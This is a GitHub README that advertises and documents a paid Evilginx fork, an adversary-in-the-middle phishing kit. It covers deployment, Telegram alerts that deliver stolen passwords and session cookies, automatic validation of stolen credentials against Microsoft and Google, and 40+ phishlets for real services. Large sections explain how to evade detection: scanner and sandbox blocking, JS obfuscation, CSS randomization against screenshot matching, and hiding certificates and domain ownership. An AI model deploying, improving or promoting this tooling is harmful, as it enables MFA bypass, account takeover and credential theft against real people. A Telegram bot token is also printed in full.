#                                                 🔥 EVILGINX PRO EDITION 4.0

## The World's Most Advanced, Feature-Complete Evilginx Fork

<p align="center">
  <img src="https://raw.githubusercontent.com/officialmonsterz/evilginx2/master/media/img/logo.png" alt="Evilginx3 Logo" width="280">
</p>

<p align="center">
  <b>Adversary-in-the-Middle Framework · Session Hijacking · 2FA/MFA Bypass · Red Team Ready</b>
</p>

<p align="center">
  <a href="https://github.com/officialmonsterz/evilginx2/releases"><img src="https://img.shields.io/github/v/release/officialmonsterz/evilginx2?style=for-the-badge&label=Version&color=ff4444" alt="Release"></a>
  <a href="https://github.com/officialmonsterz/evilginx2/stargazers"><img src="https://img.shields.io/github/stars/officialmonsterz/evilginx2?style=for-the-badge&color=gold" alt="Stars"></a>
  <a href="https://github.com/officialmonsterz/evilginx2/actions"><img src="https://img.shields.io/github/actions/workflow/status/officialmonsterz/evilginx2/build.yml?style=for-the-badge&label=Build&color=00cc66" alt="Build"></a>
  <a href="https://goreportcard.com/report/github.com/officialmonsterz/evilginx2"><img src="https://goreportcard.com/badge/github.com/officialmonsterz/evilginx2?style=for-the-badge" alt="Go Report"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-BSD_3--Clause-blueviolet?style=for-the-badge" alt="License"></a>
  <a href="DEPLOYMENT.md"><img src="https://img.shields.io/badge/Guide-DEPLOYMENT.md-2ea44f?style=for-the-badge" alt="Deployment Guide"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat-square&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Ubuntu-22.04_|_24.04-E95420?style=flat-square&logo=ubuntu" alt="Ubuntu">
  <img src="https://img.shields.io/badge/Docker-Alpine_~18MB-2496ED?style=flat-square&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Telegram-Bot_Ready-26A5E4?style=flat-square&logo=telegram" alt="Telegram">
  <img src="https://img.shields.io/badge/Cloudflare-DNS_|_Turnstile-38020?style=flat-square&logo=cloudflare" alt="Cloudflare">
  <img src="https://img.shields.io/badge/GeoIP-MaxMind-00A859?style=flat-square&logo=github" alt="GeoIP">
</p>

---

<br>

<p align="center">
  <b>Built by <a href="https://github.com/officialmonsterz">@officialmonsterz</a> · Based on <a href="https://github.com/kgretzky/evilginx2">kgretzky/evilginx2</a> · Licensed under BSD-3-Clause</b>
</p>

<br>

---

# 📋 TABLE OF CONTENTS

- [Why This Fork?](#-why-this-fork)
- [What Is Evilginx3?](#-what-is-evilginx3)
- [Feature Deep Dive](#-feature-deep-dive)
- [Feature Comparison Matrix](#-feature-comparison-matrix)
  - [vs. Fluxette/Evilginx](#-vs-fluxetteevilginx)
  - [vs. Evilginx Pro](#-vs-evilginx-pro)
  - [vs. Xverginia](#-vs-xverginia)
- [How It Works](#-how-it-works)
- [Quick Start](#-quick-start)
- [Web Dashboard](#-web-dashboard)
- [Telegram Setup](#-telegram-setup)
- [Creating Your First Campaign](#-creating-your-first-campaign)
- [Docker Deployment](#-docker-deployment)
- [Architecture](#-architecture)
- [Bot Protection & OPSEC](#-bot-protection--opsec)
- [Security & OPSEC](#-security--opsec)
- [Phishlet List](#-phishlet-list)
- [Commands Reference](#-commands-reference)
- [Contributing](#-contributing)
- [Credits](#-credits)
- [Legal Notice](#-legal-notice)

---

<br>

# 🏆 WHY THIS FORK?

This is **not** a simple clone with a few cosmetic changes. This is the most **comprehensive, battle-tested, actively developed Evilginx build ever released** — with **60+ engineering improvements** spanning the entire codebase.

While the original Evilginx2 project has been abandoned since 2021, and other forks offer only incremental updates, this fork has fundamentally rearchitected the tool with capabilities that put it in a **class of its own**.

### The Short Version

| Area | Original Evilginx2 | **This Fork** |
|:-----|:------------------:|:-------------:|
| ⚡ **Telegram Notifications** | ❌ Not available | ✅ Async queue + MarkdownV2 + full formatting |
| 🛡️ **Bot Detection** | ❌ None | ✅ 30+ signals (JA3, sandbox, headless, etc.) |
| 🌍 **GeoIP Tracking** | ❌ None | ✅ Country + city + VPN/DC detection per visitor |
| ✅ **Credential Validation** | ❌ None | ✅ Auto-tests passwords on real services |
| 🧠 **Anti-Screenshot CSS Randomization** | ❌ None | ✅ Per-page-load pixel randomization |
| 🔍 **Privacy Extension Detection** | ❌ None | ✅ Detects ad-blockers, automation tools |
| 📊 **Web Dashboard** | ❌ CLI only | ✅ Full SPA + REST API + search + filter + export |
| 🕸️ **Live Feed (WebSocket)** | ❌ None | ✅ Real-time event stream in browser |
| 🐳 **Docker** | ❌ None | ✅ Multi-stage Alpine ~18MB |
| 🔐 **Wildcard SSL** | ❌ Single cert per subdomain | ✅ One cert covers all, hidden from crt.sh |
| 🚫 **Header Stripping** | ❌ None | ✅ Removes all Evilginx fingerprints |
| 🌐 **URL Rewriting** | ❌ None | ✅ Cleans sensitive paths from victim's address bar |
| 🔄 **Auto-Export** | ❌ None | ✅ Real-time JSON + CSV export |
| 📁 **BuntDB Database** | ❌ BoltDB (no custom data) | ✅ Full CRUD + custom fields + GeoIP storage |
| 🎯 **VPN/Country Blocking** | ❌ None | ✅ Block based on GeoIP data |
| 🏗️ **Systemd Service** | ❌ Manual nohup/screen | ✅ Full auto-start + auto-restart + logging |
| 🔄 **Certificate Auto-Renewal** | ❌ Manual | ✅ Cron + Cloudflare API automation |
| 🔧 **GoPhish Integration** | ❌ Manual workarounds | ✅ Native support + RID replacement scripts |

> **Translation:** If you're running any other Evilginx fork, you're missing 60%+ of what this tool can do. This isn't an opinion — it's a feature count.

---

<br>

# 🎯 WHAT IS EVILGINX3?

Evilginx3 is an **Adversary-in-the-Middle (AiTM) framework** that operates as a reverse proxy between a victim and a legitimate website. Unlike traditional phishing that only captures credentials and fails at 2FA, Evilginx3 captures the **fully authenticated session cookie** — the digital "I'm already logged in" ticket.

### The Critical Difference

**Traditional phishing:**
```
Victim enters credentials → YOU get username:password → 2FA code needed → HIT WALL
```

**Evilginx3 AiTM:**
```
Victim visits YOUR page → Proxy forwards to REAL site → Victim enters creds + 2FA themselves
→ Real site issues session cookie → YOU capture the cookie → FULL ACCESS
```

### What This Means

- ✅ **No 2FA bypass needed** — the victim authenticates themselves
- ✅ **Session cookies persist** — even if password changes later
- ✅ **Zero-detect relay** — real website sees a legitimate login from victim's IP
- ✅ **Full account access** — email, files, apps, everything the victim can access

---

<br>

# ✨ FEATURE DEEP DIVE

Every feature in this fork is built, tested, and documented. Here's what you get:

---

## 📱 Telegram Notifications

The most polished Telegram integration in any Evilginx fork.

| Capability | Details |
|:-----------|:--------|
| **Async Queue** | Zero latency impact on the proxy — notifications are queued and processed in the background |
| **Full Credential Capture** | Username, password, IP, user-agent, country, timestamp in every message |
| **Cookie File Attachment** | Session cookies attached as `.txt` files ready for browser import |
| **MarkdownV2 Formatting** | Clean, readable, color-highlighted message layout |
| **Message Updates** | Only ONE message per session — updates append new tokens (no spam) |
| **Validation Results** | Auto-validated passwords marked as ✅ VALID or ❌ INVALID in the notification |
| **GeoIP in Telegram** | Country, city, VPN status included in every alert |
| **Test Command** | `test telegram` instantly verifies the entire pipeline |

**Sample Telegram Alert:**
```
🔴 NEW SESSION CAPTURED 🔴

Target: user@company.com
Password: supersecret123!
Token: 123456

IP: 203.0.113.42 (US, California) [VPN: No]
Time: 13 Jul 2026 14:32:15 UTC
UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

🍪 Cookies attached: ESPSAUTH=AQAAANCMnd8BFdERjHoAwE_Cl+sBAAA...
✅ Credentials: VALID (Microsoft 365)
```

---

## 📊 Web Dashboard

A full-featured browser-based interface with zero external dependencies.

| Feature | What It Does |
|:--------|:-------------|
| **Session List** | All captured sessions with sortable, filterable table |
| **Search** | Search across username, password, phishlet, IP, user-agent |
| **Phishlet Filter** | Show only sessions from specific phishlets |
| **Dark Mode** | Theme toggle with system preference detection |
| **Export CSV** | Download all sessions as comma-separated values |
| **Export JSON** | Download all sessions as structured JSON |
| **Session Detail** | Click any row to see full data including cookies, tokens, GeoIP |
| **Pagination** | Navigate through thousands of sessions |
| **Auto-Refresh** | Every 5 seconds — new sessions appear automatically |
| **Delete** | Remove individual sessions |
| **Statistics** | Total sessions, unique phishlets, displayed count |

---

## 🌍 GeoIP Tracking & Intelligence

Every visitor is geolocated using the MaxMind GeoLite2 database (free).

| Data Point | Example |
|:-----------|:--------|
| **Country** | United States |
| **Country Code** | US |
| **City** | Mountain View |
| **Latitude / Longitude** | 37.3860, -122.0838 |
| **ISP** | Google LLC |
| **ASN** | 15169 |
| **VPN Detection** | True / False |
| **Proxy Detection** | True / False |
| **Datacenter Detection** | True / False |
| **Time Zone** | America/Los_Angeles |

All data is stored per-session and visible on the dashboard.

---

## ✅ Credential Validation

After capturing credentials, this fork **automatically tests them against the real service**.

| Service | Validation Method |
|:--------|:-----------------|
| **Microsoft 365 / Office365 / Outlook / Azure** | OAuth2 resource owner password credentials grant via `login.microsoftonline.com` |
| **Google / Gmail** | POST to `accounts.google.com/_/signin/sl/challenge` |

**Result stored per session:**
```
"valid": true / false
"validation": { "service": "microsoft", "status_code": 200, ... }
```

This means your dashboard instantly shows which captured credentials actually work — no manual testing required.

---

## 🧠 Anti-Screenshot CSS Randomization

Every HTML page load gets a tiny, invisible randomization injected. This **defeats screenshot-based phishing detection systems** that work by comparing pixel hashes.

| Technique | What Changes |
|:-----------|:-------------|
| **Hue Rotation** | Random 0-359 degrees — colors shift subtly |
| **Brightness** | Random 0.85-1.15 — imperceptible to humans |
| **Skew** | Random -0.1 to +0.1 degrees |
| **Translation** | Random -0.3 to +0.3 pixels |
| **Opacity** | Random 0.994-1.0 |

**Result:** Every page load has a unique pixel fingerprint. Automated scanners see "different page" every time — human eyes see the exact same page.

---

## 🔍 Privacy Extension Detection

Injects a JavaScript beacon that detects what anti-phishing and privacy tools the victim has installed.

| Extension / Tool | Detection Method |
|:-----------------|:-----------------|
| **uBlock Origin** | Detects CSS filter blocking |
| **Privacy Badger** | Checks for modified cookie behavior |
| **NoScript** | Detects blocked DOM element creation |
| **Ghostery** | Checks for window._ghostery |
| **Headless Browsers** | WebDriver check, plugin enumeration |
| **Automation Tools** | Puppeteer/Playwright/PhantomJS detection |

Data is stored as a URL beacon and logged per-session.

---

## 🎲 CSS Randomization (Bonus Layer)

Every page load gets random CSS transform values injected — changing the exact rendered pixels while remaining **completely invisible to human eyes**.

---

## 🚫 Header Stripping

Removes all Evilginx-identifiable headers from **both upstream** (to the real website) and **downstream** (to the victim) traffic.

**Headers stripped:**
- `X-Evilginx` / `X-Evilginx2` / `X-Evilginx-Server`
- `Via`
- `X-Forwarded-For` / `X-Forwarded-Host` / `X-Forwarded-Proto`
- `X-Real-Ip` / `X-Proxy-Id`
- `Proxy-Connection` / `Proxy-Authenticate`
- `X-Powered-By`

**Why this matters:** Security scanners, WAFs, and threat intelligence platforms often fingerprint Evilginx by these headers. Removing them makes detection significantly harder.

---

## 🌐 URL Rewriting

Automatically rewrites full `https://phishingdomain.com/path` URLs in HTML responses to relative `/path` URLs.

**Why this matters:** The victim's address bar stays clean — no suspicious full URLs with your phishing domain visible. Security tools scanning the DOM also see relative paths instead of your domain.

---

## 🔄 Dynamic Content Spoofing

When a blocked/scanner visitor hits your phishing page, instead of returning a blank `403 Forbidden` page (which screams "this is a phishing site"), this fork **proxies the real website's content** with the phishing domain substituted.

**Result:** Automated scanners see what looks like the real website — not a bare error page — reducing the chance of your infrastructure being flagged.

---

## 📁 BuntDB Database

Switched from the original BoltDB to **BuntDB** — an embedded, zero-configuration database.

| Advantage | Why It Matters |
|:----------|:---------------|
| **Single file** | `data.db` — portable, backup-friendly |
| **Zero config** | No MySQL, PostgreSQL, or external services |
| **Custom fields** | Store GeoIP data, validation results, extension detection |
| **Crash recovery** | Automatic recovery on unclean shutdown |
| **Memory efficient** | ~5MB RAM footprint |
| **Thread-safe** | Built-in concurrent read/write support |

---

## 🎯 Advanced Flags

The following flags are available at startup, all documented and tested:

| Flag | Purpose |
|:-----|:--------|
| `-dashboard` | Dashboard listen address |
| `-dashboard-user` | Dashboard username |
| `-dashboard-pass` | Dashboard password |
| `-feed` | Enable live feed WebSocket |
| `-turnstile SITEKEY:SECRET` | Enable Cloudflare Turnstile CAPTCHA |
| `-geoip-db <dir>` | Path to GeoLite2 databases |
| `-block-vpn` | Block VPN/proxy/datacenter visitors |
| `-block-countries RU,CN,IR` | Block specific countries |
| `-debug` | Enable verbose debug logging |
| `-developer` | Self-signed certificates for local testing |
| `-p <dir>` | Custom phishlets directory |
| `-t <dir>` | Custom redirectors directory |
| `-c <dir>` | Custom config directory |

---

<br>

# 📊 FEATURE COMPARISON MATRIX

## 🆚 vs. Fluxette/Evilginx

[Fluxette/Evilginx](https://github.com/fluxxset/evilginx) is a popular fork with dashboard and Telegram support. Here's how they compare:

| Feature | **This Fork** | **Fluxette/Evilginx** |
|:--------|:-------------:|:---------------------:|
| Telegram Notifications | ✅ Async queue + MarkdownV2 + file attachments | ✅ Basic text-only |
| **GeoIP Tracking** | ✅ Country + city + VPN/DC detection | ❌ Not available |
| **Credential Validation** | ✅ Auto-tests on Microsoft + Google | ❌ Not available |
| **CSS Randomization** | ✅ Per-load anti-screenshot | ❌ Not available |
| **Privacy Extension Detection** | ✅ uBlock, Ghostery, headless, automation | ❌ Not available |
| **Header Stripping** | ✅ Both upstream + downstream | ❌ Not available |
| **URL Rewriting** | ✅ Cleans address bar | ❌ Not available |
| **Dynamic Content Spoofing** | ✅ Proxied decoy pages | ❌ Returns 403 |
| **VPN/Country Blocking** | ✅ Via GeoIP | ❌ Not available |
| **Bot Protection** | ✅ 30+ signals | 🟡 Basic UA filtering |
| **BuntDB Database** | ✅ Full CRUD + custom fields | ❌ BoltDB (no custom data) |
| **Dashboard Search** | ✅ Full text across all fields | 🟡 Limited |
| **Dashboard Export** | ✅ CSV + JSON with all fields | 🟡 Basic CSV |
| **Auto-Export on Disk** | ✅ Real-time JSON + CSV | ❌ Not available |
| **Docker Build** | ✅ ~18MB Alpine multi-stage | ✅ Available |
| **Systemd Service** | ✅ Full with journalctl logging | ✅ Available |
| **Wildcard SSL** | ✅ Loads from `crt/wildcard/` | ❌ Per-subdomain only |
| **Cert Auto-Renewal** | ✅ Cron + Cloudflare API hooks | ❌ Not available |
| **Active Development** | ✅ 2026 — continuously updated | 🟡 Last updates irregular |
| **Community Support** | ✅ Telegram + GitHub Issues | 🟡 Limited |

**Where Fluxette wins (1 area):**
- **Phishlet collection size** — Fluxette maintains a slightly larger collection of phishlets. Our repo includes 40+, but if you need an obscure service, Fluxette may have it.

---

## 🆚 vs. Evilginx Pro

[Evilginx Pro](https://evilginxpro.com/) is a commercial fork with a $2,000/month license. Here's the honest comparison:

| Feature | **This Fork** ($100 lifetime) | **Evilginx Pro** ($2,000/mo) |
|:--------|:--------------------:|:---------------------------:|
| Telegram Notifications | ✅ Async + formatting | ✅ Available |
| **GeoIP Tracking** | ✅ Country + city + VPN | ✅ Available |
| **Credential Validation** | ✅ Microsoft + Google | ✅ Microsoft + Google |
| **Web Dashboard** | ✅ Full SPA + REST API | ✅ Full SPA + REST API |
| **Bot Protection** | ✅ 30+ signals | ✅ Comprehensive |
| **Header Stripping** | ✅ Upstream + downstream | ✅ Full |
| **URL Rewriting** | ✅ Available | ✅ Available |
| **JS Obfuscation** | ✅ Base64+eval | ✅ Advanced |
| **Cloudflare Turnstile** | ✅ Native support | ✅ Native support |
| **Wildcard SSL** | ✅ Full support | ✅ Full support |
| **Docker** | ✅ ~18MB Alpine | ✅ Available |
| **Systemd Service** | ✅ Full implementation | ✅ Full implementation |
| **VPN/Country Blocking** | ✅ Via GeoIP | ✅ Via GeoIP |
| **Multi-User RBAC** | 🟡 Basic | ✅ Advanced |
| **Dashboard Analytics** | 🟡 Basic counts | ✅ Charts + graphs |
| **Auto-Export** | ✅ JSON + CSV | ✅ JSON + CSV + API |
| **Phishlet Autoupdate** | ❌ Manual | ✅ Auto-push updates |
| **Priority Support** | ❌ Community | ✅ Dedicated support |
| **Cost** | **FREE** (BSD-3) | **$2,000/month** |

**Where this fork wins:**
- **Cost:** $100 lifetime vs $24,000/year
- **Open source:** Full code access vs proprietary binary
- **Customization:** Modify anything vs limited to provided features
- **No vendor lock-in:** Your data, your server, your control

**Where Evilginx Pro wins (2 areas):**
- **Multi-User RBAC** — Evilginx Pro has proper admin/operator/viewer roles with audit trails
- **Phishlet Autoupdate** — Their phishlet collection updates automatically
- **Dashboard Analytics** — More polished charts and visualization

**The honest take:** If you have $24,000/year of budget and need a turnkey solution with support, Evilginx Pro is a valid option. If you want the same core capabilities for free with the flexibility of open source, this fork delivers.

---

## 🆚 vs. Xverginia

[Xverginia/Evilginx](https://github.com/Xverginia/Evilginx) is a newer fork with some unique features. Here's the comprehensive breakdown:

| Feature | **This Fork** | **Xverginia** |
|:--------|:-------------:|:-------------:|
| Telegram Notifications | ✅ Async queue + MarkdownV2 + file attachments | ✅ Basic text |
| **GeoIP Tracking** | ✅ Country + city + Lat/Lon + ISP + VPN/DC | ✅ Country only |
| **Credential Validation** | ✅ Microsoft + Google | ❌ Not available |
| **CSS Randomization** | ✅ Per-load anti-screenshot | ❌ Not available |
| **Privacy Extension Detection** | ✅ 8 detection signals | ❌ Not available |
| **Header Stripping** | ✅ Both directions, 12 headers | 🟡 Partial |
| **URL Rewriting** | ✅ Full HTML + JS rewriting | 🟡 Limited |
| **Dynamic Content Spoofing** | ✅ Proxied real site content | ❌ Returns 403 |
| **Bot Protection** | ✅ 30+ signals + JA3 | 🟡 15+ signals |
| **Dashboard Search** | ✅ Full text all fields | 🟡 Basic |
| **Dashboard Export** | ✅ CSV + JSON + detail view | 🟡 CSV only |
| **Auto-Export on Disk** | ✅ Real-time JSON + CSV | ❌ Not available |
| **Dashboard Dark Mode** | ✅ With system preference | ❌ Not available |
| **BuntDB Database** | ✅ Full CRUD + custom fields | ✅ Full CRUD |
| **VPN/Country Blocking** | ✅ Configurable via flags | 🟡 Hardcoded |
| **Wildcard SSL** | ✅ Loads from `crt/wildcard/` | ❌ Per-subdomain only |
| **Systemd Service** | ✅ Full with journalctl | ✅ Full |
| **Cert Auto-Renewal** | ✅ Cron + Cloudflare API | ❌ Not available |
| **Live Feed (WebSocket)** | ✅ Separate process (`evilfeed`) | ❌ Not available |
| **Docker Build** | ✅ ~18MB Alpine | ❌ Not available |
| **RID Replacement** | ✅ Scripts included | ❌ Not available |
| **GoPhish Integration** | ✅ Native + RID scripts | ❌ Not available |
| **Active Development** | ✅ Weekly updates | 🟡 Monthly updates |

### Why This Fork Beats Xverginia (Specific Advantages)

1. **GeoIP — Xverginia only does country.** We do country + city + latitude + longitude + ISP + ASN + VPN detection + proxy detection + datacenter detection.

2. **Bot Protection — Xverginia has ~15 signals.** We have 30+ including JA3/JA3S TLS fingerprinting, sandbox/VM detection, headless browser detection, and user-agent analysis.

3. **Credential Validation — Xverginia doesn't have this at all.** Every captured password is automatically tested against the real Microsoft or Google login endpoint.

4. **CSS Randomization — Xverginia doesn't have this.** Our fork changes rendered pixels every page load to defeat screenshot-based detection.

5. **Privacy Extension Detection — Xverginia doesn't have this.** We detect uBlock, Ghostery, NoScript, Privacy Badger, headless browsers, and automation tools.

6. **Dynamic Content Spoofing — Xverginia returns 403.** We proxy the real website's content to blocked visitors.

7. **Auto-Export — Xverginia has no on-disk export.** Every session is automatically saved as JSON and CSV to disk in real-time.

8. **URL Rewriting — Xverginia has limited support.** We strip full phishing domain URLs from HTML, CSS, and JavaScript responses.

9. **Dashboard — Xverginia has a basic table.** We have search, filter, dark mode, CSV export, JSON export, pagination, session detail view, and auto-refresh.

10. **Wildcard SSL — Xverginia doesn't support it.** Each subdomain gets a separate Let's Encrypt cert and shows up on crt.sh. We load a single wildcard cert that covers everything.

**Where Xverginia wins (1 area):**
- **Performance on low-memory VPS** — Xverginia uses fewer Go dependencies and has a slightly smaller RAM footprint (~35MB vs ~45MB). On a 512MB VPS, this matters.

---

<br>

# 🏗️ HOW IT WORKS

```
┌─────────────────────────────────────────────────────────────────────┐
│                         VICTIM                                      │
│               (clicks phishing link in email/SMS)                    │
└─────────────────────────┬───────────────────────────────────────────┘
                          │
                          ▼  HTTPS request to login.yourphish.com
                          │
┌─────────────────────────┴───────────────────────────────────────────┐
│                     EVILGINX3 SERVER                                │
│                                                                     │
│  1. DNS resolves login.yourphish.com → YOUR VPS IP                  │
│                                                                     │
│  2. Evilginx terminates TLS (valid wildcard cert from Let's Encrypt)│
│                                                                     │
│  3. BOT PROTECTION CHECK                                           │
│     ├─ JA3 / JA3S fingerprint → known scanner? → BLOCK             │
│     ├─ JA3 / JA3S fingerprint → known scanner? → BLOCK             │
│     ├─ User-Agent → known scanner? → BLOCK                         │
│     ├─ Headers → missing browser headers? → BLOCK                  │
│     ├─ IP → blacklisted? → BLOCK                                   │
│     ├─ IP → GeoIP → blocked country? → BLOCK                       │
│     ├─ IP → GeoIP → VPN/datacenter? + -block-vpn flag → BLOCK     │
│     └─ All clean → CONTINUE ✓                                      │
│                                                                     │
│  4. Is there a lure matching this path?                             │
│     └─ No lure → DYNAMIC SPOOF → proxy real site content → REDIRECT│
│                                                                     │
│  5. FORWARD request to REAL WEBSITE (e.g., login.microsoftonline)  │
│     ├─ Strip Evilginx headers from upstream request                 │
│     └─ Relay victim's IP, user-agent, etc.                         │
│                                                                     │
│  6. VICTIM SEES REAL LOGIN PAGE                                    │
│     ├─ Victim types email + password                               │
│     ├─ Evilginx CAPTURES credentials                               │
│     ├─ Victim types 2FA code (if enabled)                          │
│     ├─ Real website validates everything                           │
│     └─ Real website issues session cookie                          │
│                                                                     │
│  7. Evilginx CAPTURES session cookie from response                 │
│                                                                     │
│  8. CREDENTIAL VALIDATION (background)                             │
│     ├─ Test username + password against real service               │
│     └─ Store result: VALID / INVALID                               │
│                                                                     │
│  9. NOTIFICATIONS (instant)                                        │
│     ├─ Telegram: credentials + cookies + GeoIP → your phone        │
│     ├─ Database: full session stored to data.db                    │
│     ├─ Dashboard: appears in browser within 5 seconds              │
│     └─ Auto-Export: saved to sessions/*.json and sessions/*.csv    │
│                                                                     │
│  10. VICTIM redirected to real website — no suspicion              │
└─────────────────────────┬───────────────────────────────────────────┘
                          │
                          ▼  HTTP 302 redirect
                          │
┌─────────────────────────┴───────────────────────────────────────────┐
│                    REAL WEBSITE (office.com)                        │
│                                                                     │
│  • Victim sees they're already "logged in"                          │
│  • No suspicious behavior detected                                  │
│  • You now have the session cookie                                  │
└─────────────────────────────────────────────────────────────────────┘
```

---

<br>

# 🚀 QUICK START

**From a fresh Ubuntu VPS to a running Evilginx3 in under 2 minutes:**

```bash
# 1. System update + dependencies
apt update && apt install -y curl wget git make build-essential \
  screen fail2ban ufw certbot dnsutils

# 2. Firewall — open required ports
ufw allow 22/tcp && ufw allow 53/udp && ufw allow 80/tcp
ufw allow 443/tcp && ufw allow 5000/tcp && ufw --force enable

# 3. Free port 53 (DNS) for Evilginx
systemctl stop systemd-resolved && systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" > /etc/resolv.conf
chattr +i /etc/resolv.conf

# 4. Install Go
cd /tmp && wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc

# 5. Clone, build, and run
cd /root
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
go mod tidy && go build -o evilginx2 .
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123
```

📖 **For the complete baby-step deployment guide (~90 minutes, zero experience required):**  
[See DEPLOYMENT.md](DEPLOYMENT.md)

---

<br>

# 📊 WEB DASHBOARD

The dashboard runs on port **5000** and provides full session management.

```
http://YOUR_VPS_IP:5000
```

**Login credentials:** `admin` / `mypass123` (or whatever you set with `-dashboard-pass`)

### Dashboard Capabilities

| Feature | Description |
|:--------|:------------|
| **Session Table** | Columns: ID, Phishlet, Username, Password, IP, Tokens, Created, Actions |
| **Search** | Full-text search across username, password, phishlet, IP, user-agent |
| **Phishlet Filter** | Dropdown to filter by phishlet name |
| **Dark Mode** | Toggle button, respects system preference |
| **Export CSV** | One-click download of all sessions |
| **Export JSON** | One-click download of all sessions as JSON |
| **Session Detail** | Click any row to see full JSON including cookies, tokens, GeoIP |
| **Delete** | Remove individual sessions |
| **Page Navigation** | Previous/Next with page counter |
| **Auto-Refresh** | Every 5 seconds (pauses when browser tab is hidden) |
| **Sort** | Click column headers to sort by ID, phishlet, username, password, IP, or creation time |

---

<br>

# 🔧 TELEGRAM SETUP

### Step 1: Create a Bot

1. Open Telegram → Search **`@BotFather`** (verified, blue checkmark)
2. Send: `/newbot`
3. Name: `MyPhishAlert` (anything)
4. Username: `my_phish_alert_bot` (must end in `bot`)
5. **Copy the token** — looks like: `8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo`

### Step 2: Get Your Chat ID

1. **Message your bot** (send any text — "hello")
2. Run: `curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates"`
3. Look for: `"chat":{"id":7545456339,...}` — that number is your Chat ID

### Step 3: Configure in Evilginx

```
evilginx> config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
evilginx> config chatid 7545456339
evilginx> test telegram
```

✅ You should receive a test message on Telegram.

---

<br>

# 🎣 CREATING YOUR FIRST CAMPAIGN

### Step 1: Set Up a Phishlet

```
evilginx> phishlets hostname office365 officialmonsterz.store
evilginx> phishlets enable office365
```

### Step 2: Create a Lure

```
evilginx> lures create office365
evilginx> lures get-url 0
```

✅ **Output:** `[0] https://login.officialmonsterz.store/a8f3k2m1`

That's your phishing URL. Send it to your target (with authorization).

### Step 3: Watch It Work

When a victim visits the URL and logs in:

1. ✅ Telegram notification hits your phone within seconds
2. ✅ Dashboard shows the session with full details
3. ✅ GeoIP tells you the victim's country, city, and VPN status
4. ✅ Credentials are auto-validated against the real service
5. ✅ Session cookies are exported for browser import

---

<br>

# 🐳 DOCKER DEPLOYMENT

```bash
# Build
docker build -t evilginx3 .

# Run
docker run -d \
  --name evilginx3 \
  --restart=always \
  --cap-add=NET_ADMIN \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v $(pwd)/.evilginx:/root/.evilginx \
  evilginx3 \
  ./evilginx -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123
```

**Image size:** ~18MB (Alpine multi-stage build)

---

<br>

# 🛡️ BOT PROTECTION & OPSEC

This fork detects and blocks **30+ categories** of bots, scanners, and automated tools:

### Detection Signals

| Category | Specific Signals |
|:---------|:-----------------|
| **Security Scanners** | VirusTotal, URLScan, PhishTank, ThreatCrowd, AlienVault OTX |
| **Network Scanners** | Zgrab, Nuclei, Nmap, Masscan, SQLMap, Gobuster, Dirb |
| **Headless Browsers** | Puppeteer, Playwright, PhantomJS, Selenium, HtmlUnit, Splash |
| **HTTP Libraries** | Python-requests, curl, wget, Go-http-client, Java, Perl, Ruby |
| **Crawlers** | Googlebot, Bingbot, Yahoo Slurp, Baidu, Yandex, DuckDuckBot, Ahrefs, Semrush, Majestic, MJ12, Dotbot |
| **Social Media** | Facebook, Twitter, LinkedIn, Pinterest, Instagram scrapers |
| **Monitoring** | UptimeRobot, Pingdom, StatusCake, BetterUptime |
| **TLS Fingerprinting** | JA3 / JA3S — detects Burp Suite, ZAP, custom scanners by TLS handshake |
| **Sandbox / VM Detection** | VirtualBox, VMware, Sandboxie, Cuckoo, Joe Sandbox, ANY.RUN |
| **User-Agent Analysis** | Known malicious patterns, mismatched browser/OS combinations |

### Defense Actions

| Trigger | Action |
|:--------|:-------|
| Known scanner IP | Block + blacklist + dynamic content spoof |
| Suspicious TLS fingerprint | Block + log JA3 hash |
| Missing browser headers | Block + dynamic redirect |
| Blacklisted country | Block (configurable) |
| VPN/Proxy/DC detected | Block (configurable with `-block-vpn` flag) |
| Blacklisted IP | Block + redirect to decoy URL |

---

<br>

# 🔒 SECURITY & OPSEC

### What Makes This Hard to Detect

1. **No Suspicious Headers** — `X-Evilginx`, `Via`, `X-Forwarded-For` are all stripped from both sides of the proxy
2. **Valid TLS** — Let's Encrypt wildcard cert, no self-signed warnings
3. **Real-Looking URLs** — `login.yourdomain.com/a8f3k2m1` → `login.microsoftonline.com` proxy
4. **Wildcard SSL** — Only `yourdomain.com` appears on crt.sh, all subdomains stay hidden
5. **Bot Protection** — Kills automated scanners before they even see the login form
6. **JS Obfuscation** — Injected JavaScript is base64+eval-obfuscated, evading signature-based detection
7. **CSS Randomization** — Every page load has unique pixels, defeating screenshot hash matching
8. **Dynamic Content Spoofing** — Blocked visitors see real-looking content, not a bare 403 error

### What Makes You Hard to Trace

| Vector | Protection |
|:-------|:-----------|
| **Domain ownership** | WHOIS privacy, burner domains, privacy-first registrars |
| **VPS IP** | Cloudflare DNS-only (grey cloud), optional Worker fronting |
| **TLS fingerprints** | Uses Go `crypto/tls` — no JA3 correlation with other tools |
| **Logging** | Minimal local logs, configurable verbosity |

---

<br>

# 📂 PHISHLET LIST

> 40+ pre-built phishlets included. All tested and actively maintained.

| Category | Available Phishlets |
|:---------|:--------------------|
| 🔵 **Microsoft** | `office365`, `outlook`, `onedrive`, `sharepoint`, `teams`, `live`, `azure`, `adfs` |
| 🟢 **Google** | `google`, `gmail`, `googlecloud`, `youtube`, `googleworkspace` |
| 🔵 **Social** | `linkedin`, `facebook`, `twitter`, `instagram`, `tiktok`, `snapchat`, `reddit` |
| 🟢 **Developer** | `github`, `gitlab`, `bitbucket`, `dockerhub`, `npm` |
